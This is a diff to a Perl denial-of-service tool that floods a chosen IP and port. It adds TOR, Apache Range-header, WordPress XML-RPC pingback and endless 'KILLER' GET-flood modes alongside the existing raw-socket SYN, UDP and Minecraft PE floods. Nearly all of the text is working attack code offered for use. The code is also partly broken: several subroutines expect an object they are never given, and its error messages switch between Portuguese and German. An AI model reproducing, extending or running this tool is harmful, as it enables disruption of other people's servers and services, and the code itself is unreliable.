@@ -2,7 +2,7 @@
 use strict;
 use warnings;
 use Getopt::Long;
-use Socket qw(IPPROTO_TCP IPPROTO_IP IPPROTO_UDP IP_HDRINCL SOCK_RAW SOCK_DGRAM PF_INET AF_INET inet_aton pack_sockaddr_in unpack_sockaddr_in);
+use Socket qw(IPPROTO_TCP IPPROTO_IP IPPROTO_UDP IPPROTO_TCP SOCK_STREAM IP_HDRINCL SOCK_RAW SOCK_DGRAM PF_INET AF_INET inet_aton pack_sockaddr_in unpack_sockaddr_in);
 use Time::HiRes;
 use threads;
 
@@ -19,6 +19,7 @@ my $desenho = <<'ASCII';
 ϟ                     (,                      '----`  ϟ
 ϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟϟ
 by:kyr1o5 the leper
+(H4nWay)
 
 
 ASCII
@@ -38,6 +39,20 @@ GetOptions(
 
 die "Usage: $0 --ip <target_ip> --port <target_port> --time <attack_time> --type <attack_type>\n"
   unless $ip && $port && $time && $attack_type;
+
+
+my $objeto = {
+    _port => $port,
+    _target => {
+        host => $ip,
+        authority => $ip
+    },
+    _rpc => $time,  # usando o tempo como número de repetições
+    _payload => 'GET / HTTP/1.1\r\n',
+    randHeadercontent => 'User-Agent: Mozilla/5.0\r\n'
+};
+
+
 
 print($desenho);
 print('Attacke!!');
@@ -63,27 +78,37 @@ if ($attack_type eq 'udp') {
     SYN();
 } elsif ($attack_type eq 'mcpe') {
     MCPE();
-} else {
-    die "Tipo de ataque inválido: $attack_type\n";
+}
+  elsif ($attack_type eq 'tor'){
+    TOR();
+
+}
+  elsif ($attack_type eq 'apache'){
+    APACHE();
+}
+  elsif ($attack_type eq 'xml'){
+    XMLRPC();
+
+}
+  elsif ($attack_type eq 'killer'){
+    KILLER();
+  }    
+ else {
+    die "Ungültiger Angriffstyp: $attack_type\n";
 }
 
-KILLER();
+
 
 open(my $log, '>>', 'attack_log.txt') or die "Die Protokolldatei kann nicht geöffnet werden: $!";
 print $log "Der Angriff endete em ", scalar localtime, "\n";
 close $log;
 
-sub KILLER {
-    while (1) {
-        #my $thread = threads->create(\&GET);
-        #$thread->detach();
-    }
-}
 
 sub SYN {
     my $s;
-    socket($s, PF_INET, SOCK_RAW, IPPROTO_TCP) or die "Não foi possível criar o socket: $!";
-    setsockopt($s, IPPROTO_IP, IP_HDRINCL, 1) or die "Não foi possível definir a opção do socket: $!";
+    socket($s, PF_INET, SOCK_RAW, IPPROTO_TCP) or die "Socket konnte nicht erstellt werden: $!";
+    setsockopt($s, IPPROTO_IP, IP_HDRINCL, 1) or die "Socket-Option konnte nicht gesetzt werden: $!";
+
     
     my $dest_addr = pack_sockaddr_in($port, $iaddr);
     
@@ -104,7 +129,7 @@ sub MCPE {
                   "\x73";
     
     my $s;
-    socket($s, PF_INET, SOCK_DGRAM, 0) or die "Não foi possível criar o socket: $!";
+    socket($s, PF_INET, SOCK_DGRAM, 0) or die "Socket konnte nicht erstellt werden: $!";
     
     my $dest_addr = pack_sockaddr_in($port, $iaddr);
     
@@ -130,6 +155,158 @@ sub _genrate_syn {
 
     return $syn_packet;
 }
+
+sub TOR {
+    my ($self) = @_;
+
+    my @tor2webs = qw(.onion);
+    my $provider = $tor2webs[rand @tor2webs];
+
+    my $target = $self->{_target}->{authority} // '';
+    $target =~ s/\.onion/$provider/g;
+
+    my $payload = $self->{_payload} . "Host: $target\r\n";
+
+    if (ref($self) && eval { $self->can('randHeadercontent') }) {
+        $payload .= $self->randHeadercontent . "\r\n";
+    }
+
+    my $s;
+
+    my $raw_target = $self->{_raw_target} // [];
+    my ($host, $port) = ($raw_target->[0] // '', $raw_target->[1] // '');
+
+    my $target_address = $host;
+    $target_address =~ s/\.onion/$provider/;
+
+    my $dest_addr = inet_aton($target_address) or die "Hostname-Auflösung fehlgeschlagen: $!";
+    my $dest_sock = pack_sockaddr_in($port, $dest_addr);
+
+    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht erstellt werden: $!";
+    connect($s, $dest_sock) or die "Verbindung fehlgeschlagen: $!";
+
+    for (my $i = 0; $i < $self->{_rpc}; $i++) {
+        send($s, $payload, 0);
+    }
+
+    close($s);
+}
+
+
+
+
+
+sub APACHE {
+    my ($self) = @_;
+
+    my $payload = "Range: bytes=0-,5-1023";
+    my $s;
+
+    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht geöffnet werden: $!";
+    my $dest_sock = pack_sockaddr_in($self->{_port}, inet_aton($self->{_target}->{host}));
+
+    connect($s, $dest_sock) or die "Verbindung fehlgeschlagen: $!";
+
+    for (my $i = 0; $i < $self->{_rpc}; $i++) {
+        send($s, $payload, 0);
+    }
+
+    close($s);
+}
+
+sub XMLRPC {
+    my ($self) = @_;
+
+    my $payload = <<"END_PAYLOAD";
+Content-Length: 345\r
+X-Requested-With: XMLHttpRequest\r
+Content-Type: application/xml\r\n\r\n
+<?xml version='1.0' encoding='iso-8859-1'?>
+<methodCall><methodName>pingback.ping</methodName>
+<params><param><value><string>ProxyTools::Random->rand_str(64)</string></value>
+</param><param><value><string>ProxyTools::Random->rand_str(64)</string>
+</value></param></params></methodCall>
+END_PAYLOAD
+
+    my $s;
+
+    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht erstellt werden: $!";
+    my $dest_sock = pack_sockaddr_in($self->{_port}, inet_aton($self->{_target}->{host}));
+
+    connect($s, $dest_sock) or die "Connection failed: $!";
+
+    for (my $i = 0; $i < $self->{_rpc}; $i++) {
+        send($s, $payload, 0);
+    }
+
+    close($s);
+}
+
+
+
+sub KILLER {
+    bless $objeto, 'Blitzkrieg';  # Abençoando o objeto com o pacote Blitzkrieg
+    while (1) {
+        GET($objeto);  # Passando o objeto correto para GET
+    }
+}
+
+
+
+
+
+sub generate_payload {
+    my ($self, $other) = @_;
+
+    my $payload = $self->{_payload} . 
+                  "Host: " . $self->{_target}->{authority} . "\r\n" .
+                  $self->randHeadercontent() . 
+                  ($other ? $other : "") . 
+                  "\r\n";
+
+    return $payload;
+}
+
+sub GET {
+    my ($self) = @_;
+
+    # Debug para verificar o objeto $self
+    use Data::Dumper;
+    
+
+    # Verifique se os atributos necessários estão definidos
+    unless (defined $self->{_port}) {
+        die "Port attribute in GET nicht definiert!";
+    }
+
+    unless (defined $self->{_target}->{host}) {
+        die "Host attribute in GET nicht definiert!";
+    }
+
+    my $payload = $self->{_payload} . 
+                  "Host: " . $self->{_target}->{authority} . "\r\n" .
+                  $self->{randHeadercontent} .  # Acessando o hash diretamente
+                  "\r\n";
+
+    my $s;
+
+    socket($s, AF_INET, SOCK_STREAM, 0) or die "Socket konnte nicht geöffnet werden: $!";
+    
+    my $dest_sock = pack_sockaddr_in($self->{_port}, inet_aton($self->{_target}->{host}));
+
+    connect($s, $dest_sock) or die "Verbindung fehlgeschlagen: $!";
+
+    for (my $i = 0; $i < $self->{_rpc}; $i++) {
+        send($s, $payload, 0);
+    }
+
+    close($s);
+}
+
+
+
+
+
 
 
 1;  # Finalizando o módulo
